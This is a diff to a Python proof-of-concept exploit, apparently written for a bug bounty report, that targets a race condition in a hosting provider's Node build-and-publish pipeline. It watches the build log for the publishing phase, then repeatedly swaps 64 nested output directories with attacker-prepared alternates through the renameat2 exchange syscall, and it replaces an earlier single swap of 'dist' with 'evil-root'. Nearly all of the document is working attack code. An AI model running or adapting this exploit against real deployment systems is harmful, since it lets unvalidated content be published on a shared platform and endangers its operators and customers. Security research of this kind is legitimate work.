@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Swap an owned output path after the publisher logs its validated phase."""
+"""Race nested directories after the publisher enters its copy phase."""
 
 from __future__ import annotations
 
@@ -13,18 +13,25 @@ import time
 SYS_RENAMEAT2 = 316
 AT_FDCWD = -100
 RENAME_EXCHANGE = 2
-MARKER = b"HOSTINGER_NODE_SSH_LOG_WATCH_TOCTOU_GATE:r224"
+MARKER = b"HOSTINGER_NODE_NESTED_LOG_WATCH_TOCTOU_GATE:r226"
 PUBLISHING = b"==> Publishing"
+SLOT_COUNT = 64
 libc = ctypes.CDLL(None, use_errno=True)
-dist = os.fsencode("dist")
-alternate = os.fsencode("evil-root")
 started = time.monotonic()
 deadline = started + 30.0
 logs_root = Path.cwd().parents[1] / "logs"
+pairs = [
+    (
+        os.fsencode(f"dist/slot-{index:02d}"),
+        os.fsencode(f"race-alternates/alt-{index:02d}"),
+    )
+    for index in range(SLOT_COUNT)
+]
 trace = {
     "marker": MARKER.decode(),
     "event": "not-observed",
     "logsRootAccessible": logs_root.is_dir(),
+    "slotCount": SLOT_COUNT,
 }
 
 
@@ -46,6 +53,17 @@ def current_log() -> Path | None:
     return None
 
 
+def exchange(first: bytes, second: bytes) -> int:
+    return libc.syscall(
+        SYS_RENAMEAT2,
+        AT_FDCWD,
+        ctypes.c_char_p(first),
+        AT_FDCWD,
+        ctypes.c_char_p(second),
+        RENAME_EXCHANGE,
+    )
+
+
 log_path = None
 while time.monotonic() < deadline and log_path is None:
     log_path = current_log()
@@ -53,10 +71,7 @@ while time.monotonic() < deadline and log_path is None:
         time.sleep(0.0005)
 
 if log_path is not None:
-    trace.update(
-        event="current-log-found",
-        logFoundAfterMs=round((time.monotonic() - started) * 1000, 3),
-    )
+    trace.update(event="current-log-found", logFoundAfterMs=round((time.monotonic() - started) * 1000, 3))
     while time.monotonic() < deadline:
         try:
             tail = log_path.read_bytes()[-4096:]
@@ -66,49 +81,39 @@ if log_path is not None:
         if PUBLISHING not in tail:
             time.sleep(0.00025)
             continue
-        trace.update(
-            event="publishing-observed",
-            publishingAfterMs=round((time.monotonic() - started) * 1000, 3),
-        )
-        result = libc.syscall(
-            SYS_RENAMEAT2,
-            AT_FDCWD,
-            ctypes.c_char_p(dist),
-            AT_FDCWD,
-            ctypes.c_char_p(alternate),
-            RENAME_EXCHANGE,
-        )
-        trace["exchangeErrno"] = ctypes.get_errno() if result != 0 else 0
-        if result == 0:
-            trace["evilHeldMs"] = 1500
-            time.sleep(1.5)
-            restore = libc.syscall(
-                SYS_RENAMEAT2,
-                AT_FDCWD,
-                ctypes.c_char_p(dist),
-                AT_FDCWD,
-                ctypes.c_char_p(alternate),
-                RENAME_EXCHANGE,
-            )
-            trace["restoreErrno"] = ctypes.get_errno() if restore != 0 else 0
+        trace.update(event="publishing-observed", publishingAfterMs=round((time.monotonic() - started) * 1000, 3))
+        race_deadline = time.monotonic() + 1.5
+        loops = 0
+        exchanges = 0
+        errors = 0
+        while time.monotonic() < race_deadline:
+            for first, second in pairs:
+                if exchange(first, second) == 0:
+                    exchanges += 1
+                else:
+                    errors += 1
+            for first, second in reversed(pairs):
+                if exchange(first, second) == 0:
+                    exchanges += 1
+                else:
+                    errors += 1
+            loops += 1
+        trace.update(loops=loops, exchanges=exchanges, exchangeErrors=errors)
         break
 
-try:
-    if os.path.islink("dist") and os.path.isdir("evil-root"):
-        libc.syscall(
-            SYS_RENAMEAT2,
-            AT_FDCWD,
-            ctypes.c_char_p(dist),
-            AT_FDCWD,
-            ctypes.c_char_p(alternate),
-            RENAME_EXCHANGE,
-        )
-except OSError:
-    pass
-
+restored = 0
+for index, (first, second) in enumerate(pairs):
+    slot = Path(f"dist/slot-{index:02d}")
+    alternate = Path(f"race-alternates/alt-{index:02d}")
+    try:
+        if slot.is_symlink() and alternate.is_dir() and exchange(first, second) == 0:
+            restored += 1
+    except OSError:
+        continue
+trace["restoredSlots"] = restored
 trace["finishedAfterMs"] = round((time.monotonic() - started) * 1000, 3)
 try:
-    trace_path = Path.home() / ".h1-r224-race-trace.json"
+    trace_path = Path.home() / ".h1-r226-race-trace.json"
     trace_path.write_text(json.dumps(trace, sort_keys=True))
     trace_path.chmod(0o600)
 except OSError:
